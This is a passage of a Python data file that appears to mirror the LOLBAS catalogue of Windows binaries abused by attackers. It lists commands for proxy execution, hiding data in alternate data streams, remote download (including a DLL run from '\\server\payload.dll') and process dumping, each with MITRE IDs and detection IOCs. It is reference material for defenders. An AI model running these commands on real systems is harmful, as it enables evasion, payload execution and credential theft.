                    "Description": "Use dllhost.exe to load a registered or hijacked COM Server payload.",
                    "Usecase": "Execute a DLL Surrogate COM Object.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1546.015",
                    "MitreLink": "https://attack.mitre.org/techniques/T1546/015/",
                    "OperatingSystem": "Windows 10 (and likely previous versions)",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\dllhost.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\dllhost.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/CyberRaiju/status/1167415118847598594"},
                {
                    "Link": "https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08"
                },
            ],
            "Acknowledgement": [
                {"Person": "Jai Minton", "Handle": "AT_SYMBOLCyberRaiju"},
                {"Person": "Nasreddine Bencherchali", "Handle": "AT_SYMBOLnas_bench"},
            ],
            "pname": "dllhost",
        },
        {
            "Name": "Diantz.exe",
            "Description": "Binary that package existing files into a cabinet (.cab) file",
            "Author": "Tamir Yehuda",
            "Created": "08/08/2020",
            "Commands": [
                {
                    "Command": "diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab",
                    "Description": "Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.",
                    "Usecase": "Hide data compressed into an Alternate Data Stream.",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019",
                },
                {
                    "Command": "diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab",
                    "Description": "Download and compress a remote file and store it in a cab file on local machine.",
                    "Usecase": "Download and compress into a cab file.",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\diantz.exe"},
                {"Path": "c:\\windows\\syswow64\\diantz.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "diantz storing data into alternate data streams."},
                {"IOC": "diantz getting a file from a remote machine or the internet."},
            ],
            "Resources": [
                {
                    "Link": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diantz"
                }
            ],
            "Acknowledgement": [
                {"Person": "Tamir Yehuda", "Handle": "AT_SYMBOLtim8288"},
                {"Person": "Hai Vaknin", "Handle": "AT_SYMBOLvakninhai"},
            ],
            "pname": "diantz",
        },
        {
            "Name": "Ttdinject.exe",
            "Description": "Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)",
            "Author": "Maxime Nadeau",
            "Created": "2020-05-12",
            "Commands": [
                {
                    "Command": 'TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "C:/Windows/System32/calc.exe"',
                    "Description": "Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",
                    "Usecase": "Spawn process using other binary",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 2004",
                },
                {
                    "Command": 'ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "C:/Windows/System32/calc.exe"',
                    "Description": "Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",
                    "Usecase": "Spawn process using other binary",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 1909",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\ttdinject.exe"},
                {"Path": "C:\\Windows\\Syswow64\\ttdinject.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Parent child relationship. Ttdinject.exe parent for executed command"
                },
                {
                    "IOC": 'Multiple queries made to the IFEO registry key of an untrusted executable (Ex. "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\payload.exe") from the ttdinject.exe process'
                },
            ],
            "Resources": [
                {"Link": "https://twitter.com/Oddvarmoe/status/1196333160470138880"}
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
                {"Person": "Maxime Nadeau", "Handle": "AT_SYMBOLm_nad0"},
            ],
            "pname": "ttdinject",
        },
        {
            "Name": "Explorer.exe",
            "Description": "Binary used for managing files and system components within Windows",
            "Author": "Jai Minton",
            "Created": "2020-06-24",
            "Commands": [
                {
                    "Command": 'explorer.exe /root,"C:\\Windows\\System32\\calc.exe"',
                    "Description": "Execute calc.exe with the parent process spawning from a new instance of explorer.exe",
                    "Usecase": "Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows XP, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "explorer.exe C:\\Windows\\System32\\notepad.exe",
                    "Description": "Execute calc.exe with the parent process spawning from a new instance of explorer.exe",
                    "Usecase": "Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 (Tested)",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\explorer.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\explorer.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Multiple instances of explorer.exe or explorer.exe using the /root command line can help to detect this."
                }
            ],
            "Resources": [
                {
                    "Link": "https://twitter.com/CyberRaiju/status/1273597319322058752?s=20"
                },
                {"Link": "https://twitter.com/bohops/status/1276356245541335048"},
                {"Link": "https://twitter.com/bohops/status/986984122563391488"},
            ],
            "Acknowledgement": [
                {"Person": "Jai Minton", "Handle": "AT_SYMBOLCyberRaiju"},
                {"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"},
            ],
            "pname": "explorer",
        },
        {
            "Name": "Register-cimprovider.exe",
            "Description": "Used to register new wmi providers",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'Register-cimprovider -path "C:\\folder\\evil.dll"',
                    "Description": "Load the target .DLL.",
                    "Usecase": "Execute code within dll file",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\Register-cimprovider.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\Register-cimprovider.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://twitter.com/PhilipTsukerman/status/992021361106268161"
                }
            ],
            "Acknowledgement": [
                {"Person": "Philip Tsukerman", "Handle": "AT_SYMBOLPhilipTsukerman"}
            ],
            "pname": "register-cimprovider",
        },
        {
            "Name": "Pcalua.exe",
            "Description": "Program Compatibility Assistant",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "pcalua.exe -a calc.exe",
                    "Description": "Open the target .EXE using the Program Compatibility Assistant.",
                    "Usecase": "Proxy execution of binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "pcalua.exe -a \\\\server\\payload.dll",
                    "Description": "Open the target .DLL file with the Program Compatibilty Assistant.",
                    "Usecase": "Proxy execution of remote dll file",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "pcalua.exe -a C:\\Windows\\system32\\javacpl.cpl -c Java",
                    "Description": "Open the target .CPL file with the Program Compatibility Assistant.",
                    "Usecase": "Execution of CPL files",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\pcalua.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/KyleHanslovan/status/912659279806640128"}
            ],
            "Acknowledgement": [
                {"Person": "Kyle Hanslovan", "Handle": "AT_SYMBOLkylehanslovan"},
                {"Person": "Fab", "Handle": "AT_SYMBOL0rbz_"},
            ],
            "pname": "pcalua",
        },
        {
            "Name": "Tttracer.exe",
            "Description": "Used by Windows 1809 and newer to Debug Time Travel",
            "Author": "Oddvar Moe",
            "Created": "2019-11-5",
            "Commands": [
                {
                    "Command": "tttracer.exe C:\\windows\\system32\\calc.exe",
                    "Description": "Execute calc using tttracer.exe. Requires administrator privileges",
                    "Usecase": "Spawn process using other binary",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 1809 and newer",
                },
                {
                    "Command": "TTTracer.exe -dumpFull -attach pid",
                    "Description": "Dumps process using tttracer.exe. Requires administrator privileges",
                    "Usecase": "Dump process by PID",
                    "Category": "Dump",
                    "Privileges": "Administrator",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003",
                    "OperatingSystem": "Windows 10 1809 and newer",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\tttracer.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\tttracer.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Parent child relationship. Tttracer parent for executed command"
                }
            ],
            "Resources": [
                {"Link": "https://twitter.com/oulusoyum/status/1191329746069655553"},
                {
                    "Link": "https://twitter.com/mattifestation/status/1196390321783025666"
                },
                {
                    "Link": "https://lists.samba.org/archive/cifs-protocol/2016-April/002877.html"
                },
            ],
            "Acknowledgement": [
                {"Person": "Onur Ulusoy", "Handle": "AT_SYMBOLoulusoyum"},
                {"Person": "Matt Graeber", "Handle": "AT_SYMBOLmattifestation"},
            ],
            "pname": "tttracer",
        },
        {
            "Name": "Pcwrun.exe",
            "Description": "Program Compatibility Wizard",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Pcwrun.exe c:\\temp\\beacon.exe",
                    "Description": "Open the target .EXE file with the Program Compatibility Wizard.",
                    "Usecase": "Proxy execution of binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\pcwrun.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/991335019833708544"}
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "pcwrun",
        },
        {
            "Name": "Regedit.exe",
            "Description": "Used by Windows to manipulate registry",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey",
                    "Description": "Export the target Registry key to the specified .REG file.",
                    "Usecase": "Hide registry data in alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "regedit C:\\ads\\file.txt:regfile.reg",
                    "Description": "Import the target .REG file into the Registry.",
                    "Usecase": "Import hidden registry data from alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\regedit.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\regedit.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "regedit.exe reading and writing to alternate data stream"},
                {"IOC": "regedit.exe should normally not be executed by end-users"},
            ],
            "Resources": [
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "regedit",
        },
        {
            "Name": "Atbroker.exe",
            "Description": "Helper binary for Assistive Technology (AT)",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "ATBroker.exe /start malware",
                    "Description": "Start a registered Assistive Technology (AT).",
                    "Usecase": "Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistibe Technology (AT) service entry.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\Atbroker.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\Atbroker.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Changes to HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration"
                },
                {
                    "IOC": "Changes to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs"
                },
                {
                    "IOC": "Unknown AT starting C:\\Windows\\System32\\ATBroker.exe /start malware"
                },
            ],
            "Resources": [
                {
                    "Link": "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/"
                }
            ],
            "Acknowledgement": [{"Person": "Adam", "Handle": "AT_SYMBOLhexacorn"}],
            "pname": "atbroker",
        },
        {
            "Name": "GfxDownloadWrapper.exe",
            "Description": "Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.",
            "Author": "Jesus Galvez",
            "Created": "Jesus Galvez",
            "Commands": [
                {
                    "Command": 'C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"',
                    "Description": 'GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by "Microsoft Windows Hardware", "Compatibility Publisher", "Microsoft Windows Third Party Component CA 2012", "Microsoft Time-Stamp PCA 2010", "Microsoft Time-Stamp Service".',
                    "Usecase": "Download file from internet",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/techniques/T1105/",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\64kb6472.inf_amd64_3daef03bbe98572b\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_comp.inf_amd64_0e9c57ae3396e055\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_comp.inf_amd64_209bd95d56b1ac2d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_comp.inf_amd64_3fa2a843f8b7f16d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_comp.inf_amd64_85c860f05274baa0\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_comp.inf_amd64_f7412e3e3404de80\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_comp.inf_amd64_feb9f1cf05b0de58\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_component.inf_amd64_0219cc1c7085a93f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_component.inf_amd64_df4f60b1cae9b14a\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dc_comp.inf_amd64_16eb18b0e2526e57\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dc_comp.inf_amd64_1c77f1231c19bc72\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dc_comp.inf_amd64_31c60cc38cfcca28\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dc_comp.inf_amd64_82f69cea8b2d928f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dc_comp.inf_amd64_b4d94f3e41ceb839\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_0606619cc97463de\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_0e95edab338ad669\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_22aac1442d387216\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_2461d914696db722\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_29d727269a34edf5\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_2caf76dbce56546d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_353320edb98da643\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_4ea0ed0af1507894\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_56a48f4f1c2da7a7\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_64f23fdadb76a511\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_668dd0c6d3f9fa0e\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_6be8e5b7f731a6e5\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_6dad7e4e9a8fa889\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_6df442103a1937a4\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_767e7683f9ad126c\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_8644298f665a12c4\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_868acf86149aef5d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_92cf9d9d84f1d3db\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_93239c65f222d453\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_9de8154b682af864\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_a7428663aca90897\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_ad7cb5e55a410add\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_afbf41cf8ab202d7\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_d193c96475eaa96e\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_db953c52208ada71\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_e7523682cc7528cc\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_e9f341319ca84274\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_f3a64c75ee4defb7\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch.inf_amd64_f51939e52b944f4b\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch_comp.inf_amd64_4938423c9b9639d7\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch_comp.inf_amd64_c8e108d4a62c59d5\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\cui_dch_comp.inf_amd64_deecec7d232ced2b\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_01ee1299f4982efe\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_02edfc87000937e4\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_0541b698fc6e40b0\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_0707757077710fff\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_0b3e3ed3ace9602a\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_0cff362f9dff4228\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_16ed7d82b93e4f68\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_1a33d2f73651d989\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_1aca2a92a37fce23\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_1af2dd3e4df5fd61\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_1d571527c7083952\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_23f7302c2b9ee813\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_24de78387e6208e4\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_250db833a1cd577e\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_25e7c5a58c052bc5\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_28d80681d3523b1c\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_2dda3b1147a3a572\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_31ba00ea6900d67d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_329877a66f240808\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_42af9f4718aa1395\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_4645af5c659ae51a\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_48c2e68e54c92258\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_48e7e903a369eae2\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_491d20003583dabe\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_4b34c18659561116\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_51ce968bf19942c2\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_555cfc07a674ecdd\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_561bd21d54545ed3\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_579a75f602cc2dce\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_57f66a4f0a97f1a3\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_587befb80671fb38\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_62f096fe77e085c0\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_6ae0ddbb4a38e23c\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_6bb02522ea3fdb0d\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_6d34ac0763025a06\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_712b6a0adbaabc0a\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_78b09d9681a2400f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_842874489af34daa\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_88084eb1fe7cebc3\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_89033455cb08186f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_8a9535cd18c90bc3\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_8c1fc948b5a01c52\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_9088b61921a6ff9f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_90f68cd0dc48b625\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_95cb371d046d4b4c\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_a58de0cf5f3e9dca\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_abe9d37302f8b1ae\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_acb3edda7b82982f\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_aebc5a8535dd3184\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_b5d4c82c67b39358\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_b846bbf1e81ea3cf\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_babb2e8b8072ff3b\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_bc75cebf5edbbc50\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_be91293cf20d4372\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_c11f4d5f0bc4c592\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_c4e5173126d31cf0\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_c4f600ffe34acc7b\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_c8634ed19e331cda\\"
                },
                {
                    "Path": "c:\\windows\\system32\\driverstore\\filerepository\\igdlh64.inf_amd64_c9081e50bcffa972\\"
                },
                {
